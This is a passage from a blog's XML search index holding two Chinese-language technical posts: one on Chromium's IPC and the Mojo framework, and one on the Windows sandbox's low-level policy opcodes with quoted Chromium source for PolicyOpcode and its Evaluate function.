<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Chromium IPC</title>
      <link href="posts/42c3081f/"/>
      <url>posts/42c3081f/</url>
      
        <content type="html"><![CDATA[<h1 id="IPC-Overview"><a href="#IPC-Overview" class="headerlink" title="IPC Overview"></a>IPC Overview</h1><p>由于 Chromium 是多进程架构，这就意味着各个进程之间需要互相通信进行消息同步，主要的原始通信手段便是管道。每个renderer 进程都有一个管道，用来和 borwser 进行通信。管道以异步模式使用，以确保任何一端在等待另一端时都不会被阻塞。</p><p>注意：所有的网络通信都是由浏览器的主进程来处理的。</p><p>在 chromium 的多进程架构下可以分为 3 层看，最底层是 <code>Blink</code>，是负责渲染页面的引擎。中间层是<code>Renderer</code>，每个标签页都含有一个 renderer，每个 renderer 进程都有一个 Blink 实例。最顶层是浏览器进程，管理所有的 renderer，控制所有的网络访问。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804104619.png"></p><h2 id="IPC-in-the-browser"><a href="#IPC-in-the-browser" class="headerlink" title="IPC in the browser"></a>IPC in the browser</h2><ul><li><p>浏览器与渲染器的通信是在一个单独的 I/O 线程中完成的。</p></li><li><p>浏览器与 views 的通信，必须由<code>ChannelProxy</code>代理转发到主线程。如此，例如网页资源请求这种最常见、关系性能的信息可以在 I/O 线程上处理，而不会阻塞用户界面。</p></li><li><p>这些是通过使用由 RenderProcessHost 插入到通道中的 ChannelProxy::MessageFilter 来完成的</p></li><li><p><code>ChannelProxy::MessageFilter</code>在 I/O 线程中运行，拦截资源请求消息，并将其直接转发给资源调度程序主机(resource dispatcher host)</p></li></ul><h2 id="IPC-in-the-renderer"><a href="#IPC-in-the-renderer" class="headerlink" title="IPC in the renderer"></a>IPC in the renderer</h2><ul><li><p>每个 renderer 都有一个单独的线程来管理通信，另一个线程来完成渲染和其他操作处理。</p></li><li><p>大多数消息通过主渲染器线程从浏览器发送到WebKit线程，反之亦然。这个额外的线程是为了支持同步 renderer-to-browser 消息。</p></li></ul><h2 id="Types-of-messages"><a href="#Types-of-messages" class="headerlink" title="Types of messages"></a>Types of messages</h2><p>Chromium 的消息类别主要有两种： <code>routed</code> <code>control</code>。</p><p>Control messages 由创建管道的类处理。有时，该类将允许其他<code>listeners</code>通过 MessageRouter 对象接收消息，其他 listeners 可以注册该对象，并接收使用其唯一id发送的 <code>routed</code> 消息。</p><p>Routed messages 用于将消息发送到特定的 RenderViewHost。不过从技术上讲，任何类都可以通过使用 <code>RenderProcessHost::GetNextRoutingID</code> 接收路由消息，并通过调用<code>RenderProcessHost::AddRoute</code> 注册自己。目前，RenderViewHost 和 RenderFrameHost 实例都有自己的路由 id。</p><p>浏览器和渲染器之间的通信是和消息类型无关的，从浏览器发送到渲染器的与 document’s frame 相关的消息称为 frame 消息，它们被发送到 RenderFrame。类似的，从渲染器发送到浏览器的消息称为FrameHost消息，它们被发送到 RenderFrameHost。</p><p>插件也有独立的进程。像渲染消息一样，有 PluginProcess 消息(从浏览器发送到插件进程)和 PluginProcessHost 消息(从插件进程发送到浏览器)。</p><h1 id="Mojo"><a href="#Mojo" class="headerlink" title="Mojo"></a>Mojo</h1><p>在新的文档？发现这样一句话， **Legacy IPC is deprecated.**所以原文档后面的一些关于 messages 的处理和声明部分便没有继续观看。在网上找到<a href="https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&IPC/">一篇总结很好的文章</a>，这里引用一下。</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Mojo 是一个跨平台 IPC 框架，它诞生于 chromium ，用来实现 chromium 进程内/进程间的通信。目前，它也被用于 ChromeOS。</p><p>Mojo 系统 API 提供了一套低等级的 IPC 原语：<strong>message pipes</strong>, <strong>data pipes</strong>,  <strong>shared buffers</strong>.</p><p>关于message pipes：消息管道是一种轻量级原语，用于双向传输相对较小的数据包。该管道有两个端点，任意一个端点都可以通过另一个消息管道进行传输。因为浏览器进程和每个子进程之间都存在一个原始的消息管道，用户同样可以创建一个新管道并且发送数据到任意进程的任意的管道的任意一端，并且该通道两端可以无缝独占互相通信。</p><h2 id="mojo-术语"><a href="#mojo-术语" class="headerlink" title="mojo 术语"></a>mojo 术语</h2><ul><li><strong>Message Pipe</strong>: 每个消息管道都有两个端点，一对端点和任一端点可以通过另一个消息管道来传输信息。因为浏览器进程和每个子进程之间引导了一个原始消息管道，这意味着我们创建的新管道将任一端发送到任何进程，并且两端仍然能够无缝且排他地相互通信。</li><li><strong>Mojom file</strong>: 定义接口，它们是强类型的消息集合。 每个接口消息大致类似于单个原型消息</li><li><strong>Remote</strong>: 通过接口发送信息数据</li><li><strong>Receiver</strong>: 用于接收<strong>Remote</strong>发送的接口消息</li><li><strong>PendingRemote</strong>: 用于容纳 Receiver 管道另一端的类型化容器。</li><li><strong>PendingReceiver</strong>: 用于容纳 Remote 管道另一端的类型化容器。</li><li><strong>AssociatedRemote/Receiver</strong>: 类似于遥控器和接收器。 但是，它们在单个消息管道上的多个接口上运行，同时保留消息顺序，因为 AssociatedRemote/Receiver 是通过使用传统 IPC 消息使用的 IPC::Channel 实现的。</li></ul><h2 id="mojo-架构"><a href="#mojo-架构" class="headerlink" title="mojo 架构"></a>mojo 架构</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142536.png"></p><ul><li><strong>Mojo Core：</strong>mojo 的核心层(由 C++ 实现).每个使用Mojo进行进程间通信的进程被称之为Mojo embedder，这个进程需要链接 Core代码。Mojo Core 针对不同的系统实现具体IPC通信机制。</li><li><strong>Mojo System API(C):</strong> Mojo 的公共的 C 语言 API 合集，mojo 初始化完成后，任意进程可调用。但该API几乎不会直接调用，它是构建更高级别Mojo API的基础。它提供了消息管道，数据管道，共享buffer等创建及交互的Mojo API，以及进程间的引导连接API。</li><li><strong>Mojo System API(C++/Java/JS)：</strong>Mojo 的各种语言包装层，它将 Mojo C API 包装成多种语言的库，让其他语言可以使用。</li><li><strong>Mojo Bindings：</strong>这一层引入一种称为 Mojom 的 IDL（接口定义）语言，通过它可以定义通信接口，这些接口会生成接口类，使用户只要实现这些接口就可以使用 Mojo 进行通信，这一层使得IPC两端不需要通过原始字节流进行通信，而是通过接口进行通信。</li></ul><p>除了上面提到的那些层之外，在 Chromium 中还有2个模块对 Mojo 进行了包装，分别是 Services(//services) 模块和 IPC(//ipc) 模块。</p><ol><li><code>Services</code>: 一种更高层次的IPC机制，构建于Mojo之上，以<code>Service</code>的级别来进行IPC通信，Chromium大量使用这种IPC机制来包装各种服务，用来取代 <code>Legacy Chrome IPC</code>，比如device服务，preferences服务，audio服务，viz服务等。</li><li><code>Legacy Chrome IPC</code>: 已经不推荐使用的Chrome IPC机制，提供 <code>IPC::Channel</code> 接口以及大量的使用宏来定义的 messages 类。目前它底层也是基于 Mojo 来实现的，但是上层接口和旧的 Chrome IPC 保持一致。chromium 中还有很多IPC使用这种方式，但是不应该在新的服务中使用这种机制。可以在<a href="https://source.chromium.org/chromium/chromium/src/+/master:ipc/ipc_message_start.h;bpv=1;bpt=0">ipc/ipc_message_start.h</a>中查看还有哪些部分在使用这种IPC机制。</li></ol><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><p>Mojo 支持在<strong>多个</strong>进程之间互相通信，这一点和其他的IPC有很大不同，其他大多只支持2个进程之间进行通信。由Mojo组成的这些可以互相通信的进程就形成了一个网络，在这个网络内的任意两个进程都可以进行通信，并且每个进程只能处于一个Mojo网络中，在这个网络内每一个进程内部有且只有一个<code>Node</code>,每一个<code>Node</code>可以提供多个<code>Port</code>，每个<code>Port</code>对应一种服务，这点类似TCP/IP中的IP地址和端口的关系。一个<code>Node:Port</code>对可以唯一确定一个服务。<code>Node</code>和<code>Node</code>之间通过<code>Channel</code>来实现通信，在不同平台上<code>Channel</code>有不同的实现方式，在Linux上是domain socket,在windows上是name pipe，在MAC OS平台上是 Mach Port。在Port上一层，Mojo封装了3个“应用层协议”，分别为<code>MessagePipe</code>，<code>DataPipe</code>和<code>SharedBuffer</code>（类似在TCP上封装了HTTP，SMTP等）。整体结构如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142004.png"></p><p>上图展示了在两个进程间使用Mojo的数据流。它有以下几个特点：</p><ol><li><code>Channel</code>: Mojo内部的实现细节，对外不可见，用于包装系统底层的通信通道，在Linux下是domain socket,Windows下是name pipe，MAC OS下是mach port；</li><li><code>Node</code>: 每个进程只有一个Node，它在Mojo中的作用相当于TCP/IP中的IP地址，同样是内部实现细节，对外不可见；</li><li><code>Port</code>: 每个进程可以有上百万个Port，它在Mojo中的作用相当于TCP/IP中的端口，同样是内部实现细节，对外不可见，每个Port都必定会对应一种应用层接口，目前Mojo支持三种应用层接口；</li><li><code>MessagePipe</code>: 应用层接口，用于进程间的<strong>双向</strong>通信，类似UDP,消息是基于数据包的，底层使用Channel通道；</li><li><code>DataPipe</code>: 应用层接口，用于进程间<strong>单向</strong>块数据传递，类似TCP,消息是基于数据流的，底层使用系统的Shared Memory实现；</li><li><code>SharedBuffer</code>: 应用层接口，支持<strong>双向</strong>块数据传递，底层使用系统Shared Memory实现；</li><li><code>MojoHandle</code>： 所有的 MessagePipe,DataPipe,SharedBuffer 都使用MojoHandle来包装，有了这个Hanle就可以对它们进行读写操作。还可以通过MessagePipe将MojoHandle发送到网络中的任意进程。</li><li><a href="https://source.chromium.org/chromium/chromium/src/+/master:mojo/public/cpp/platform/platform_handle.h;drc=b64eedb9d23e0350557a9bb22c9217ae52cd82c3;bpv=1;bpt=1;l=42"><code>PlatformHanle</code></a>: 用来包装系统的句柄或文件描述符，可以将它转换为MojoHandle然后发送到网络中的任意进程</li></ol><h3 id="MessagePipe"><a href="#MessagePipe" class="headerlink" title="MessagePipe"></a>MessagePipe</h3><p>一个进程中可以有N多个MessagePipe，所有的MessagePipe都共享底层的一条通信通道，就像下图这样：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210804142007.png"></p><blockquote><p>需要特别说明的是，Mojo不是只能在不同进程间使用，它从一开始就考虑了在单进程中使用的场景，并且有专门的优化，因此，使用Mojo带来的一个额外好处是，在Mojo的一端进行读写不必知道另一端是运行在当前进程还是外部进程，这非常有利于将单进程程序逐步的使用Mojo拆分为多进程程序，并且可以在调试的时候使用单进程方便调试，在正式环境中使用多进程缩小程序崩溃时的影响范围</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="http://dev.chromium.org/developers/design-documents/multi-process-resource-loading">http://dev.chromium.org/developers/design-documents/multi-process-resource-loading</a></p><p>[2] <a href="https://chromium.googlesource.com/chromium/src.git/+/51.0.2704.48/docs/mojo_in_chromium.md">https://chromium.googlesource.com/chromium/src.git/+/51.0.2704.48/docs/mojo_in_chromium.md</a></p><p>[3] <a href="https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&amp;IPC/">https://keyou.github.io/blog/2020/01/03/Chromium-Mojo&amp;IPC/</a></p><p>[4] <a href="https://gclxry.com/article/chromium-new-inter-process-communication-system-mojo-and-servicification/">https://gclxry.com/article/chromium-new-inter-process-communication-system-mojo-and-servicification/</a></p>]]></content>
      
      
      <categories>
          
          <category> Chromium </category>
          
          <category> IPC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chromium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sandbox low-level-policy</title>
      <link href="posts/28399a6/"/>
      <url>posts/28399a6/</url>
      
        <content type="html"><![CDATA[<h1 id="Opcode"><a href="#Opcode" class="headerlink" title="Opcode"></a>Opcode</h1><h2 id="Opcode-1"><a href="#Opcode-1" class="headerlink" title="Opcode"></a>Opcode</h2><p>低级策略(low-level-policy)是使用策略“操作码”的概念实现的。操作码是一种包含足够信息的结构，可以对单个输入参数执行一次比较，下面给出了几个比较的范例：</p><ul><li>Is input parameter 3 not equal to nullptr?</li><li>Does input parameter 2 start with L”c:\“?</li><li>Is input parameter 5, bit 3 is equal 1?</li></ul><p>每个操作码实际上相当于一个函数调用，但操作码知道原函数的参数的个数是 原函数的参数个数-1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool fn(a, b, c, d)  with 4 arguments</span><br><span class="line">Then an opcode is: op(fn, b, c, d)</span><br><span class="line"></span><br><span class="line">关于操作码评估：</span><br><span class="line">op.eval(a)  ------------------------&gt; fn(a,b,c,d)</span><br><span class="line">                internally calls</span><br><span class="line">                </span><br><span class="line">评估是在具有N个比较操作码加1个动作操作码的操作码组中进行的。 </span><br><span class="line"></span><br><span class="line">[comparison 1][comparison 2]...[comparison N][action][comparison 1]...</span><br><span class="line">   ----- evaluation order-----------&gt;</span><br></pre></td></tr></table></figure><p>每个操作码组编码一个高级策略规则。仅当组上的所有条件计算为true时，该规则才适用。操作操作码包含该特定规则的策略结果。</p><p>关于 opcode：</p><ul><li>每个 opcode 都有其对应的Options，这些Options在创建 opcode 的时候就已经被指定。</li><li>每个 opcode 由：opcodeID、 一个index索引表示哪个是输入参数、一个参数数组三部分组成。</li><li>opcode 由 borker 进程中生成的，并作为原始内存复制到目标进程</li><li>一个opcode组由N个comparison opcodes加上一个action opcode组成</li></ul><h3 id="OpcodeID"><a href="#OpcodeID" class="headerlink" title="OpcodeID"></a>OpcodeID</h3><p>以下是已实现的操作码。</p><ul><li><p><strong>OP_ALWAYS_FALSE：</strong> Evaluates to false (EVAL_FALSE).</p></li><li><p><strong>OP_ALWAYS_TRUE：</strong> Evaluates to true (EVAL_TRUE).</p></li><li><p><strong>OP_NUMBER_MATCH：</strong>Match a 32-bit integer as n == a.</p></li><li><p><strong>OP_NUMBER_MATCH_RANGE：</strong>Match a 32-bit integer as a &lt;= n &lt;= b.</p></li><li><p><strong>OP_NUMBER_AND_MATCH：</strong>Match using bitwise AND; as in: n &amp; a != 0.</p></li><li><p><strong>OP_WSTRING_MATCH：</strong>Match a string for equality.</p></li><li><p><strong>OP_ACTION：</strong>Evaluates to an action opcode.</p></li></ul><h3 id="Opcode-Options"><a href="#Opcode-Options" class="headerlink" title="Opcode Options"></a>Opcode Options</h3><p>适用于每个操作码的选项。它们在使用OpcodeFactory::MakeOpXXXXX()函数族创建每个操作码时指定。</p><ul><li><strong>const uint32_t kPolNone = 0 ：</strong>无特殊含义。</li><li><strong>const uint32_t kPolNegateEval = 1：</strong>将<code>EVAL_TRUE</code>转换为<code>EVAL_FALSE</code>，反之亦然。这允许表示否定条件，例如<code>if(a&amp;&amp;!b)</code></li><li><strong>const uint32_t kPolClearContext = 2：</strong>将<code>MatchContext</code>结构归零。这发生在操作码被<code>evaluated</code>之后。</li><li><strong>const uint32_t kPolUseOREval = 4：</strong>在评估这组操作码时使用 OR。默认情况下，策略评估器在评估时使用 AND。与 kPolNegateEval 一起使用时非常有用。例如使用这个标志可以把 if(! (a &amp;&amp; b &amp;&amp; c)) 表示为if ((!a) || (!b) || (!c))</li></ul><h3 id="Comparison-opcode"><a href="#Comparison-opcode" class="headerlink" title="Comparison opcode"></a>Comparison opcode</h3><ul><li><p><strong>EVAL_TRUE：</strong>  Opcode condition evaluated true.</p></li><li><p><strong>EVAL_FALSE：</strong> Opcode condition evaluated false.</p></li><li><p><strong>EVAL_ERROR：</strong>Opcode condition generated an error while evaluating.</p></li></ul><h3 id="Action-opcode"><a href="#Action-opcode" class="headerlink" title="Action opcode"></a>Action opcode</h3><ul><li><strong>ASK_BROKER：</strong>target 必须向 broker 生成一个IPC。在浏览器端，这意味着授予访问权限。</li><li><strong>DENY_ACCESS：</strong>没有授予对资源的访问权限。</li><li><strong>GIVE_READONLY：</strong>授予对资源的只读访问权限</li><li><strong>GIVE_ALLACCESS：</strong>授予对资源的完全访问权限。</li><li><strong>GIVE_CACHED：</strong>不需要 IPC。 target可以返回缓存的句柄。</li><li><strong>GIVE_FIRST：</strong>TODO(cpu)</li><li><strong>SIGNAL_ALARM：</strong> 不寻常的活动。 产生警报。</li><li><strong>FAKE_SUCCESS：</strong>不调用原始函数。 只需返回’成功’。</li><li><strong>FAKE_ACCESS_DENIED：</strong>不调用原始函数。 只需返回“拒绝”，不进行 IPC通信。</li><li><strong>TERMINATE_PROCESS：</strong>销毁target进程。 IPC通信。</li></ul><h2 id="Policyopcde"><a href="#Policyopcde" class="headerlink" title="Policyopcde"></a>Policyopcde</h2><p>policy opcode是基于此运营的，除了第一个参数都存储在此对象中进行裁决。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.h</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PolicyOpcode</span> &#123;</span></span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">OpcodeFactory</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// 评估函数，根据opcode是comparison还是action，返回两类结果</span></span><br><span class="line">  <span class="comment">// parameters: 一个存储输入参数的数组</span></span><br><span class="line">  <span class="comment">// count: 第一个参数传递的参数的数量。</span></span><br><span class="line">  <span class="comment">// match: 在操作码求值序列中保留的匹配上下文。</span></span><br><span class="line">  <span class="function">EvalResult <span class="title">Evaluate</span><span class="params">(<span class="keyword">const</span> ParameterSet* parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                      MatchContext* match)</span></span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Valid index values are from 0 to &lt; kArgumentCount.</span></span><br><span class="line">  <span class="comment">// 根据 index，返回参数</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetArgument</span><span class="params">(<span class="keyword">size_t</span> index, T* argument)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(T) &lt;= <span class="keyword">sizeof</span>(arguments_[<span class="number">0</span>]), <span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">    *argument = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> T*&gt;(&amp;arguments_[index].mem);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sets a stored argument by index. </span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetArgument</span><span class="params">(<span class="keyword">size_t</span> index, <span class="keyword">const</span> T&amp; argument)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(T) &lt;= <span class="keyword">sizeof</span>(arguments_[<span class="number">0</span>]), <span class="string">&quot;invalid size&quot;</span>);</span><br><span class="line">    *<span class="keyword">reinterpret_cast</span>&lt;T*&gt;(&amp;arguments_[index].mem) = argument;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检索字符串参数的实际地址 </span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="keyword">wchar_t</span>* <span class="title">GetRelativeString</span><span class="params">(<span class="keyword">size_t</span> index)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">ptrdiff_t</span> str_delta = <span class="number">0</span>;</span><br><span class="line">    GetArgument(index, &amp;str_delta);</span><br><span class="line">    <span class="comment">// 字符串的GetArgument返回的是一个offset</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* delta = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(<span class="keyword">this</span>) + str_delta;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">wchar_t</span>*&gt;(delta);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns true if this opcode is an action opcode without actually</span></span><br><span class="line">  <span class="comment">// evaluating it. Used to do a quick scan forward to the next opcode group.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">IsAction</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> (OP_ACTION == opcode_id_); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the opcode type.</span></span><br><span class="line">  <span class="function">OpcodeID <span class="title">GetID</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> opcode_id_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the stored options such as kPolNegateEval and others.</span></span><br><span class="line">  <span class="function"><span class="keyword">uint32_t</span> <span class="title">GetOptions</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> options_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Sets the stored options such as kPolNegateEval.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetOptions</span><span class="params">(<span class="keyword">uint32_t</span> options)</span> </span>&#123; options_ = options; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the parameter of the function the opcode concerns.</span></span><br><span class="line">  <span class="function"><span class="keyword">uint16_t</span> <span class="title">GetParameter</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> parameter_; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> kArgumentCount = <span class="number">4</span>;  <span class="comment">// The number of supported argument.</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">OpcodeArgument</span> &#123;</span></span><br><span class="line">    UINT_PTR mem;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// Better define placement new in the class instead of relying on the</span></span><br><span class="line">  <span class="comment">// global definition which seems to be fubared.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span>, <span class="keyword">void</span>* location)</span> </span>&#123; <span class="keyword">return</span> location; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 真正去评估的函数</span></span><br><span class="line">  <span class="function">EvalResult <span class="title">EvaluateHelper</span><span class="params">(<span class="keyword">const</span> ParameterSet* parameters,</span></span></span><br><span class="line"><span class="function"><span class="params">                            MatchContext* match)</span></span>;</span><br><span class="line">  OpcodeID opcode_id_;</span><br><span class="line">  <span class="keyword">int16_t</span> parameter_;</span><br><span class="line">  <span class="keyword">uint32_t</span> options_;</span><br><span class="line">  OpcodeArgument arguments_[PolicyOpcode::kArgumentCount];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="PolicyOpcode-Evaluate"><a href="#PolicyOpcode-Evaluate" class="headerlink" title="PolicyOpcode::Evaluate()"></a>PolicyOpcode::Evaluate()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/policy_engine_opcodes.cc</span></span><br><span class="line"><span class="comment">//此函数是评估任何操作码的唯一入口。</span></span><br><span class="line"><span class="function">EvalResult <span class="title">PolicyOpcode::Evaluate</span><span class="params">(<span class="keyword">const</span> ParameterSet* call_params,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">size_t</span> param_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  MatchContext* match)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!call_params)</span><br><span class="line">    <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">  <span class="keyword">const</span> ParameterSet* selected_param = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (parameter_ &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(parameter_) &gt;= param_count) &#123;</span><br><span class="line">      <span class="keyword">return</span> EVAL_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    selected_param = &amp;call_params[parameter_];</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">//selected_param借助parameter_的值找到本次想要处理的ParameterSet</span></span><br><span class="line">  EvalResult result = EvaluateHelper(selected_param, match);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 不管操作码的具体类型是什么，都应用通用选项。</span></span><br><span class="line">  <span class="keyword">if</span> (kPolNone == options_) &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果本PolicyOpcode的标记了kPolNegateEval位，那么就要对结果取反（ERROR不管）</span></span><br><span class="line">  <span class="keyword">if</span> (options_ &amp; kPolNegateEval) &#123;</span><br><span class="line">    <span class="keyword">if</span> (EVAL_TRUE == result) &#123;</span><br><span class="line">      result = EVAL_FALSE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EVAL_FALSE == result) &#123;</span><br><span class="line">      result = EVAL_TRUE;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EVAL_ERROR != result) &#123;</span><br><span class="line">      result = EVAL_ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (match) &#123;</span><br><span class="line">      <span class="comment">// 如果标记了kPolClearContext位，那么要对辅助结构MatchContext进行清理工作</span></span><br><span class="line">    <span class="keyword">if</span> (options_ &amp; kPolClearContext)</span><br><span class="line">      match-&gt;Clear();</span><br><span class="line">      <span class="comment">// 如果标记了kPolUseOREval，那么就对辅助结构MatchContext打上标记</span></span><br><span class="line">    <span class="keyword">if</span> (options_ &amp; kPolUseOREval)</span><br><span class="line">      match-&gt;options = kPolUseOREval;<span class="comment">//默认是用AND来裁决，该标记表示用OR</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OPCODE_EVAL(op, x, 